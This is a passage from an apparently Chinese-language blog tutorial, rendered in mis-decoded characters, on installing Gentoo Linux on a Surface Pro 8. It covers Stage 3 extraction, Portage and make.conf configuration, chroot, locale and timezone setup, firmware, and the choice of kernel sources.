3"></a>å®‰è£… Stage 3</h2><p><code>Stage</code> å¯ä»¥ç®€å•ç†è§£ä¸ºæ„å»º Gentoo Linux ç³»ç»Ÿçš„å„ä¸ªä¸åŒé˜¶æ®µï¼š</p><ul><li><code>Stage 1</code> ï¼šé€šå¸¸ä»… Gentoo å†…éƒ¨å¼€å‘äººå‘˜ä½¿ç”¨ï¼Œç”±ä¸€ä¸ªåŸºæœ¬çš„ <code>packages,build</code> æ–‡ä»¶ç”Ÿæˆçš„ç³»ç»ŸåŒ…</li><li><code>Stage 2</code> ï¼šé€šå¸¸ä»… Gentoo å†…éƒ¨å¼€å‘äººå‘˜ä½¿ç”¨ï¼Œä» Stage 1 ç¼–è¯‘è€Œæ¥çš„å¯ä»¥è‡ªä¸¾çš„å·¥å…·é“¾</li><li><code>Stage 3</code> ï¼šç”± Stage 2 ç¼–è¯‘è€Œæ¥çš„æ–‡ä»¶ï¼Œå¹¶åŒ…å«ä¸€ç»„  <a href="https://wiki.gentoo.org/wiki/System_set_(Portage)">@system set</a> è½¯ä»¶åŒ…</li><li><code>Stage 4</code> ï¼šåœ¨ Stage 3 åŸºç¡€ä¸Šå®‰è£…å¥½çš„å®Œæ•´çš„ Gentoo ç³»ç»Ÿ</li></ul><p>é¦–å…ˆæˆ‘ä»¬å°† <a href="https://www.gentoo.org/downloads/">Stage 3</a> ä¸‹è½½åˆ°æ–‡ä»¶ç³»ç»Ÿæ ¹ç›®å½•ä¸‹è§£å‹ï¼Œç¬”è€…æ¯”è¾ƒä¹ æƒ¯ systemd æ‰€ä»¥è¿˜æ˜¯é€‰æ‹© systemd + desktop ç‰ˆçš„ï¼š</p><blockquote><p>systemd æŸç§ç¨‹åº¦ä¸Šä¹Ÿæˆä¸ºäº† Linux çš„äº‹å®æ ‡å‡†äº†ï¼Œä¸å¾—ä¸æ„Ÿå¹çº¢å¸½çš„å¤§æ‰‹â€¦ä½†ç¬”è€…ç›¸æ¯”èµ· OpenRC è€Œè¨€ç¡®å®æ¯”è¾ƒä¹ æƒ¯ systemdï¼Œæ‰€ä»¥ä¹Ÿæ²¡ä»€ä¹ˆå¥½çº ç»“çš„â€¦</p><p><img src="https://syste.md/"></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cd</span> /mnt/gentoo</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">wget https://distfiles.gentoo.org/releases/amd64/autobuilds/20240428T163427Z/stage3-amd64-desktop-systemd-20240428T163427Z.tar.xz</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">tar xpvf stage3-*.tar.xz --xattrs-include=<span class="hljs-string">&#x27;*.*&#x27;</span> --numeric-owner</span><br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯é…ç½®æœºå™¨æ—¶é—´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">chronyd -q</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥é…ç½®ç¼–è¯‘é€‰é¡¹ï¼ŒPortage åœ¨è¿è¡Œæ—¶ä¼šè¯»å–ä¸€ä¸ª <code>make.conf</code> é…ç½®æ–‡ä»¶ï¼Œä½äºæ–‡ä»¶ç³»ç»Ÿæ ¹ç›®å½•ä¸‹çš„ <code>/etc/portage/make.conf</code> å½“ä¸­ï¼ŒStage 3 æ–‡ä»¶ä¸­å·²ç»ç»™æˆ‘ä»¬æä¾›å¥½äº†ä¸€ä¸ªç©ºç™½æ¨¡æ¿ï¼Œå…¶ä¸­ä¸»è¦æ˜¯ä¸€äº›ç¼–è¯‘å‚æ•°ä¸é€‰é¡¹ï¼Œæˆ‘ä»¬åªéœ€è¦æ ¹æ®è‡ªèº«ä¹ æƒ¯è¿›è¡Œä¿®æ”¹å³å¯ï¼š</p><blockquote><p>ä¸€èˆ¬æ¥è¯´åªéœ€è¦åœ¨ <code>COMMON_FLAGS</code> ä¸­æ·»åŠ  <code>-march=native</code> ä»¥å‘Šè¯‰ç¼–è¯‘å™¨é€‰æ‹©å½“å‰çš„ç³»ç»Ÿä½“ç³»ç»“æ„ï¼Œæ­¤æ—¶ GCC ä¼šè‡ªåŠ¨è°ƒæŸ¥ CPU å¹¶é…ç½®åˆé€‚çš„ flagï¼Œä½†è‹¥æ˜¯å½“å‰æœºå™¨æ­£åœ¨ä¸ºå…¶ä»–æœºå™¨ç¼–è¯‘æ—¶åˆ™ä¸åº”å½“å¯ç”¨è¯¥é¡¹</p><p>å¯¹äºå†…å­˜æ¯”è¾ƒå°çš„è®¾å¤‡ï¼Œåˆ™ä¸åº”å½“å¯ç”¨ <code>-pipe</code> ç¼–è¯‘é€‰é¡¹ï¼Œå› ä¸ºè¿™ä½¿ç”¨ç®¡é“è€Œéæ–‡ä»¶æ¥å­˜æ”¾ç¼–è¯‘ä¸­é—´æ–‡ä»¶ï¼Œè€Œè¿™å°†å ç”¨æ›´å¤šçš„å†…å­˜ï¼Œä»è€Œå¯¼è‡´ç¼–è¯‘å™¨å¯èƒ½è¢« kill æ‰è€Œç¼–è¯‘å¤±è´¥</p><p>å…¶ä»–çš„å¯ç”¨é€‰é¡¹å¯ä»¥å‚ç…§ <a href="https://wiki.gentoo.org/wiki//etc/portage/make.conf">Gentoo wiki</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">vim ./etc/portage/make.conf</span><br></code></pre></td></tr></table></figure><h2 id="å®‰è£…åŸºæœ¬ç³»ç»Ÿ"><a href="#å®‰è£…åŸºæœ¬ç³»ç»Ÿ" class="headerlink" title="å®‰è£…åŸºæœ¬ç³»ç»Ÿ"></a>å®‰è£…åŸºæœ¬ç³»ç»Ÿ</h2><p>æ¥ä¸‹æ¥å¤åˆ¶ DNS ä¿¡æ¯ï¼Œä»è€Œç¡®ä¿ chroot ä¹‹åæœ‰ç½‘å¯ç”¨ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cp</span> --dereference /etc/resolv.conf /mnt/gentoo/etc/</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æŒ‚è½½ä¸€äº›å¿…è¦çš„æ–‡ä»¶ç³»ç»Ÿå¹¶ chroot åˆ°æ ¹ç›®å½•ï¼Œä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡ <code>arch-chroot /mnt/gentoo</code> å‘½ä»¤å®Œæˆï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --types proc /proc /mnt/gentoo/proc</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --rbind /sys /mnt/gentoo/sys</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --make-rslave /mnt/gentoo/sys</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --rbind /dev /mnt/gentoo/dev</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --make-rslave /mnt/gentoo/dev</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --<span class="hljs-built_in">bind</span> /run /mnt/gentoo/run</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --make-slave /mnt/gentoo/run</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">chroot</span> /mnt/gentoo /bin/bash</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">source</span> /etc/profile</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">export</span> PS1=<span class="hljs-string">&quot;(chroot) <span class="hljs-variable">$&#123;PS1&#125;</span>&quot;</span></span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥é…ç½® Portage ä»“åº“ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> --parents /etc/portage/repos.conf</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cp</span> /usr/share/portage/config/repos.conf /etc/portage/repos.conf/gentoo.conf</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å®‰è£… Gentoo ebuild æ•°æ®åº“å¿«ç…§ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge-webrsync</span><br></code></pre></td></tr></table></figure><blockquote><p>ï¼ˆå¯é€‰é…ç½®ï¼šé€‰æ‹©é•œåƒç«™ï¼‰</p><p>è‹¥æœ‰éœ€è¦ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ <code>mirrorselect</code> è¿™ä¸ªå·¥å…·æ¥æ‰‹åŠ¨é€‰æ‹©æƒ³è¦ä½¿ç”¨çš„é•œåƒæºï¼ˆç©ºæ ¼é”®é€‰ä¸­å enterï¼Œå¯ä»¥é€‰å¤šä¸ªé¡¹ï¼‰ï¼Œæœ¬è´¨ä¸Šæ˜¯å¾€ <code>make.conf</code> ä¸­å†™å…¥æ–°çš„ <code>GENTOO_MIRRORS</code> å˜é‡ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask --verbose --oneshot app-portage/mirrorselect</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mirrorselect -i -o &gt;&gt; /etc/portage/make.conf</span><br></code></pre></td></tr></table></figure></blockquote><p>æ¥ä¸‹æ¥é…ç½®ç³»ç»Ÿçš„ <code>profile</code> ï¼ˆå†³å®šäº†ç³»ç»Ÿçš„é»˜è®¤é…ç½®ï¼Œä¾‹å¦‚ <code>USE</code> å’Œ <code>CFLAGS</code> ç­‰ï¼‰ï¼Œç¬¬ä¸€æ¡å‘½ä»¤ç”¨æ¥æŸ¥çœ‹å¯ç”¨é…ç½®ï¼Œç¬¬äºŒæ¡åˆ™è¿›è¡Œé€‰æ‹©ï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©äº† <code>default/linux/amd64/23.0/desktop/plasma/systemd</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect profile list</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect profile <span class="hljs-built_in">set</span> 28</span><br></code></pre></td></tr></table></figure><blockquote><p>ï¼ˆå¯é€‰é…ç½®ï¼šæ·»åŠ äºŒè¿›åˆ¶åŒ…æºï¼‰</p><p>ä¼—æ‰€å‘¨çŸ¥ gentoo æ˜¯ä¸ªå‡ ä¹ä»»ä½•ä¸œè¥¿éƒ½è¦è‡ªè¡Œç¼–è¯‘çš„å‘è¡Œç‰ˆï¼Œå¦‚æœä½ ä¸æƒ³åœ¨å½“å‰æœºå™¨ä¸Šè¿›è¡Œç¼–è¯‘ï¼Œè€Œæƒ³è¦åƒå…¶ä»–å‘è¡Œç‰ˆé‚£æ ·ç›´æ¥æ‹¿äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ï¼Œåˆ™å¯ä»¥é…ç½®ä¸€ä¸ª <code>binary package host</code> ï¼Œè¿™å¯ä»¥æ˜¯ä½ çš„å¦ä¸€å° Gentoo æœºå™¨ï¼Œä¹Ÿå¯ä»¥æ˜¯å®˜æ–¹æˆ–æ˜¯å…¶ä»–äººçš„æº</p><p>æºåœ°å€éœ€è¦å†™åœ¨ <code>/etc/portage/binrepos.conf/gentoobinhost.conf</code> æ–‡ä»¶ä¸­ï¼Œè¿™æ˜¯å®˜æ–¹ç»™çš„ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[binhost]</span><br><span class="hljs-attr">priority</span> = <span class="hljs-number">9999</span><br><span class="hljs-attr">sync-uri</span> = https://distfiles.gentoo.org/releases/&lt;arch&gt;/binpackages/&lt;profile&gt;/x86-<span class="hljs-number">64</span>/<br></code></pre></td></tr></table></figure><p>å¯¹äºæƒ³è¦ä»¥è·å–äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶çš„å½¢å¼è¿›è¡Œå®‰è£…çš„è½¯ä»¶åŒ…ï¼Œåœ¨ä½¿ç”¨ <code>emerge</code> å®‰è£…è½¯ä»¶æ—¶æ·»åŠ  <code>--getbinpkg</code> å³å¯ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä¿®æ”¹ <code>/etc/portage/make.conf</code> æ–‡ä»¶å¹¶æ·»åŠ  <code>FEATURES</code> å˜é‡æ¥å®Œæˆï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># Appending getbinpkg to the list of values within the FEATURES variable</span><br><span class="hljs-attr">FEATURES</span>=<span class="hljs-string">&quot;$&#123;FEATURES&#125; getbinpkg&quot;</span><br><span class="hljs-comment"># Require signatures</span><br><span class="hljs-attr">FEATURES</span>=<span class="hljs-string">&quot;$&#123;FEATURES&#125; binpkg-request-signature&quot;</span><br></code></pre></td></tr></table></figure><p>è‹¥é€‰æ‹©è¿™ç§æ–¹å¼ï¼Œåˆ™åœ¨ä¿®æ”¹åéœ€è¦é¢å¤–è¿è¡Œ <code>getuto</code> å‘½ä»¤è¿›è¡Œé…ç½®</p></blockquote><p>æ¥ä¸‹æ¥é…ç½® <code>CPU_FLAGS_*</code> å˜é‡ï¼Œç¼–è¯‘å™¨ä¼šåœ¨ç¼–è¯‘ç‰¹å®šæ±‡ç¼–ä»£ç &#x2F;æŒ‡ä»¤æ—¶ä½¿ç”¨ï¼Œç¬”è€…æ˜¯ <code>x86/64</code> æ¶æ„æ‰€ä»¥åº”å½“ä¸º <code>CPU_FLAGS_X86</code> ï¼Œä¸è¿‡å·¥å…· <code>cpuid2cpuflags</code> å¯ä»¥å¸®æˆ‘ä»¬å®Œæˆè¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask --oneshot app-portage/cpuid2cpuflags</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*/* <span class="hljs-subst">$(cpuid2cpuflags)</span>&quot;</span> &gt; /etc/portage/package.use/00cpu-flags</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åœ¨ <code>/etc/portage/make.conf</code> ä¸­æ·»åŠ  <code>VIDEO_CARDS</code> å˜é‡ï¼Œç”¨ä»¥æ°å½“åœ°é…ç½® GPUï¼ŒSurface Pro 8 åªæœ‰ä¸€ä¸ª Intel æ ¸æ˜¾æ‰€ä»¥è¯¥å˜é‡åº”ä¸ºï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">VIDEO_CARDS</span>=<span class="hljs-string">&quot;intel&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>ï¼ˆå¯é€‰é…ç½®ï¼šå¯æ¥å—çš„ Licenseï¼‰</p><p>å¦‚æœä½ å¯¹è½¯ä»¶åŒ…æœ‰ License æ´ç™–ï¼Œä¸æ˜¯ GPL&#x2F;MIT&#x2F;.. çš„ä¸ç”¨ï¼Œåˆ™å¯ä»¥é…ç½® <code>ACCEPT_LICENSE</code> å˜é‡ï¼Œå»ºè®®å‚ç…§å®˜æ–¹çš„ handbook</p><p>å¦‚æœæƒ³å…¨éƒ½æ¥æ”¶ï¼Œåˆ™åœ¨ <code>/etc/portage/make.conf</code> ä¸­å°†è¯¥å˜é‡è®¾ä¸ºï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">ACCEPT_LICENSE</span>=<span class="hljs-string">&quot;*&quot;</span><br></code></pre></td></tr></table></figure></blockquote><p>æ¥ä¸‹æ¥é…ç½®æ—¶åŒºï¼Œç¬”è€…ç”¨çš„æ˜¯ systemd ï¼Œæ‰€ä»¥ç›´æ¥å°†æ—¶åŒºæ–‡ä»¶è½¯é“¾æ¥åˆ° <code>/etc/localtime</code> å³å¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">ln</span> -sf ../usr/share/zoneinfo/Australia/Melbourne /etc/localtime</span><br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯è¿›è¡Œæœ¬åœ°åŒ–é…ç½®ï¼Œåœ¨ <code>/etc/locale.gen</code> ä¸­æ·»åŠ å¯¹åº”é¡¹å³å¯ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">en_US</span> ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span><br><span class="hljs-attribute">en_US</span>.UTF-<span class="hljs-number">8</span> UTF-<span class="hljs-number">8</span><br><span class="hljs-attribute">zh_CN</span> GBK <br><span class="hljs-attribute">zh_CN</span>.UTF-<span class="hljs-number">8</span> UTF-<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¿è¡Œ <code>locale-gen</code> å‘½ä»¤ï¼Œå…¶ä¼šæ ¹æ®  <code>/etc/locale.gen</code> ä¸­é¡¹è¿›è¡Œç”Ÿæˆï¼Œç”Ÿæˆç»“æŸåé€šè¿‡ <code>eselect</code> å‘½ä»¤è¿›è¡Œé€‰æ‹©ï¼Œè¿™é‡Œæœ€å¥½å…ˆé€‰æ‹© <code>C.utf8</code> ï¼Œå®Œæˆä¹‹åæ›´æ–°ç¯å¢ƒå˜é‡ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">locale-gen</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect locale list</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect locale <span class="hljs-built_in">set</span> 2</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">env-update &amp;&amp; <span class="hljs-built_in">source</span> /etc/profile &amp;&amp; <span class="hljs-built_in">export</span> PS1=<span class="hljs-string">&quot;(chroot) <span class="hljs-variable">$&#123;PS1&#125;</span>&quot;</span></span><br></code></pre></td></tr></table></figure><p>å¯¹äºä¸­æ–‡ç”¨æˆ·ï¼Œä½ å¯èƒ½ä¼šéœ€è¦ gentoo ä¸­æ–‡ç¤¾åŒºçš„ä»“åº“ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask app-eselect/eselect-repository</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect repository <span class="hljs-built_in">enable</span> gentoo-zh</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emaint <span class="hljs-built_in">sync</span> -r gentoo-zh</span><br></code></pre></td></tr></table></figure><h2 id="ç¼–è¯‘ä¸å®‰è£…å†…æ ¸"><a href="#ç¼–è¯‘ä¸å®‰è£…å†…æ ¸" class="headerlink" title="ç¼–è¯‘ä¸å®‰è£…å†…æ ¸"></a>ç¼–è¯‘ä¸å®‰è£…å†…æ ¸</h2><blockquote><p>ï¼ˆå¯é€‰é…ç½®ï¼šå®‰è£…å›ºä»¶ä¸å¾®ç ï¼‰</p><p>åœ¨å¼€å§‹é…ç½®å†…æ ¸å‰æˆ‘ä»¬å¯ä»¥å®‰è£…å¯é€‰çš„å¾®ç ä¸å›ºä»¶ï¼ŒSurface Pro 8 æ˜¯ Intel CPUï¼Œæ‰€ä»¥å¾®ç åº”å½“å®‰è£… <code>sys-firmware/intel-microcode</code> åŒ…ï¼Œå›ºä»¶åˆ™éƒ½ä¸ºé€šç”¨çš„ <code>sys-kernel/linux-firmware</code> åŒ…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-firmware/intel-microcode</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-kernel/linux-firmware</span><br></code></pre></td></tr></table></figure><p>å¯èƒ½ä¼šé‡åˆ° <code>all ebuilds that could satisfy * have been masked</code> çš„é”™è¯¯ï¼Œè¿™æ˜¯å› ä¸º LICENSE é…ç½®é—®é¢˜ï¼Œé€šè¿‡å¦‚ä¸‹å‘½ä»¤è¿›è¡Œè¡¥å……å³å¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;sys-kernel/linux-firmware @BINARY-REDISTRIBUTABLE&quot;</span> | <span class="hljs-built_in">tee</span> -a /etc/portage/package.license</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;sys-firmware/intel-microcode @BINARY-REDISTRIBUTABLE&quot;</span> | <span class="hljs-built_in">tee</span> -a /etc/portage/package.license</span><br></code></pre></td></tr></table></figure></blockquote><p>è™½ç„¶å†…æ ¸ä¸»çº¿æš‚ä¸”ç¼ºå°‘ä¸€äº› Surface é©±åŠ¨ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªç¤¾åŒºé¡¹ç›® <a href="https://github.com/linux-surface/linux-surface">linux-surface</a> æä¾›äº†éƒ¨åˆ†é©±åŠ¨ï¼Œå¯æƒœçš„æ˜¯è¯¥é¡¹ç›®æœ¬èº«ä»…æä¾› Arch&#x2F;Debian&#x2F;Fedora çš„ç‰ˆæœ¬ï¼Œè€Œåœ¨ Wiki ä¸­ fork åˆ° Gentoo è¿™è¾¹<a href="https://github.com/Parinz/Surface-Gentoo">å¯¹åº”ä»“åº“</a>çš„ç»´æŠ¤è€…ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™å·²ç»è·‘è·¯äº†ï¼Œå› æ­¤ç¬”è€…åªèƒ½å…ˆç”¨é»˜è®¤çš„å†…æ ¸ï¼Œè¿™é‡Œæˆ‘ä»¬æœ‰ä¸‰ç§å¤§æ–¹å‘ä¸Šçš„é€‰æ‹©ï¼š</p><ul><li>å®‰è£… <a href="https://wiki.gentoo.org/wiki/Project:Distribution_Kernel">Distribution kernels</a>ï¼šGentoo å®˜æ–¹ç»´æŠ¤çš„ kernelï¼Œæ¶µç›–äº†å†…æ ¸ç¼–è¯‘å®‰è£…çš„å®Œæ•´è¿‡ç¨‹ä¸”å·²ç»é…ç½®å¥½äº†ä¸€ä»½æ”¯æŒä¸»è¦ç¡¬ä»¶çš„é…ç½®æ–‡ä»¶ï¼Œ<a href="https://wiki.gentoo.org/wiki/Project:Distribution_Kernel#Modifying_kernel_configuration">é…ç½®æ–‡ä»¶ä¹Ÿå¯ä»¥æ‰‹å·¥æ›´æ”¹</a>ï¼Œå®‰è£…æ–¹æ³•ä¸è£…æ™®é€šè½¯ä»¶åŒ…æ— å¼‚</li><li>ä½¿ç”¨ <a href="https://wiki.gentoo.org/wiki/Genkernel">Genkernel</a> è¿›è¡Œé…ç½®ï¼š<code>genkernel</code> æ˜¯ Gentoo å®˜æ–¹æä¾›çš„ç”¨æ¥è‡ªåŠ¨æ„å»ºå†…æ ¸ä¸ initramfs çš„è½¯ä»¶ï¼Œç®€åŒ–äº†ä½¿ç”¨è€…æ‰‹å·¥å®‰è£…å†…æ ¸çš„è¿‡ç¨‹</li><li>çº¯æ‰‹å·¥ç¼–è¯‘å®‰è£…å†…æ ¸ï¼šé€šè¿‡ <code>eselect kernel</code> æ‹‰å–å†…æ ¸æºç åæ‰‹å·¥ <code>make</code> è¿›è¡Œé…ç½®ã€ç¼–è¯‘ã€å®‰è£…ï¼Œ_<a href="https://github.com/arttnba3/XDU-SCE_OS-Experiment_2021/tree/main/Exp-7">å°±åƒä½ çš„æ“ä½œç³»ç»Ÿè€å¸ˆè®©ä½ åœ¨æ“ä½œç³»ç»Ÿå®éªŒè¯¾ä¸Šåšçš„é‚£æ ·</a>_ ï¼Œ <del>æ²¡è®©ä½ è‡ªå·±ä» kernel.org æ‹‰å°±å·ç€ä¹å§</del></li></ul><p>ä½œä¸º Linux kernel hackerï¼Œæ‰‹å·¥ç¼–è¯‘å†…æ ¸è‡ªç„¶æ˜¯ç¬¬ä¸€é€‰æ‹©ï¼Œä¸»è¦åŸå› æ˜¯æ–¹ä¾¿æ›´æ”¹ç¼–è¯‘é€‰é¡¹ <del>è€Œä¸”è¿™æ ·çœ‹èµ·æ¥ä¼šæ˜¾å¾—ğŸ‘´æ¯”è¾ƒå¸…</del> </p><blockquote><p>ä¸é€‰ distribution çš„åŸå› æ˜¯é…ç½®æ–‡ä»¶ä¸­å¯èƒ½æœªå¿…é»˜è®¤åŒ…å«ç¬”è€…éœ€è¦çš„ç¡¬ä»¶é©±åŠ¨ï¼Œå†é€æ¡æ”¹èµ·æ¥æœ‰ç‚¹éº»çƒ¦ï¼Œè€Œ Genkernel æ„Ÿè§‰æœ‰ç‚¹ä¸Šä¸å»ä¸‹ä¸æ¥å¡åœ¨é‚£é‡Œäº†</p></blockquote><p>é¦–å…ˆå®‰è£…å¿…è¦çš„å·¥å…·ï¼š</p><blockquote><p>å…¶ä¸­ <a href="https://wiki.gentoo.org/wiki/Installkernel">installkernel</a> æ˜¯å¯é€‰åŒ…ï¼Œç”¨äºè‡ªåŠ¨å®‰è£…æ–°çš„å†…æ ¸å¹¶æ›´æ–° bootloader é…ç½®ï¼Œ <del>å¦‚æœä½ æ¯”è¾ƒé—²çš„è¯ä¹Ÿå¯ä»¥æ‰‹å·¥å®Œæˆ</del></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-apps/pciutils</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-kernel/installkernel</span><br></code></pre></td></tr></table></figure><p>æ‹‰å– Gentoo å®˜æ–¹ç»´æŠ¤çš„å†…æ ¸æºç ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-kernel/gentoo-sources</span><br></code></pre></td></tr></table></figure><blockquote><p>å¦‚æœä½ é€‰æ‹©ç”¨ gentoo å®˜æ–¹çš„å†…æ ¸é…ç½®ï¼ˆ<code>gentoo-kernel</code>ï¼‰ï¼Œå¯èƒ½å‡ºç°æç¤ºéœ€è¦æ£€æŸ¥ configure çš„é—®é¢˜ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ä¿®å¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">dispatch-conf</span><br></code></pre></td></tr></table></figure><p>åŸºæœ¬ä¸Šä¸€è·¯ <code>u</code> ï¼ˆupdateï¼‰ å³å¯</p></blockquote><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹å½“å‰å®‰è£…çš„æºç ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect kernel list</span><br></code></pre></td></tr></table></figure><p>é€šå¸¸æˆ‘ä»¬ä¼šåœ¨ Linux ç³»ç»Ÿä¸­ç»´æŠ¤ä¸€ä¸ªæŒ‡å‘å½“å‰å†…æ ¸æºç çš„ç¬¦å·é“¾æ¥ 